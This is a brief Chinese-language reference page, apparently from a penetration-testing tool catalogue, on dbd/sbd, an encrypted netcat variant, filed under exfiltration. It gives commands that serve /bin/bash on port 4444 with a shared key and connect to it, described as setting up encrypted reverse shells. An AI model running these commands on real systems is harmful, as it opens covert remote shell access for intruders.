# dbd-sbd

## 简介
加密版 netcat，支持 AES/Blowfish 加密

## 核心参数
- `-l`: 监听模式
- `-p`: 端口
- `-k`: 加密密钥

## 命令示例
```bash
# 监听模式（加密）
dbd -l -p 4444 -e /bin/bash -k secretkey

# 连接模式
dbd -c 192.168.1.100 -p 4444 -k secretkey

# 使用 Blowfish 加密
sbd -l -p 4444 -e /bin/bash -k secretkey
```

## 使用场景
建立加密的反向 shell 连接

## 所属分类
- [数据渗出 (Exfiltration)](../categories/21-exfiltration.md)
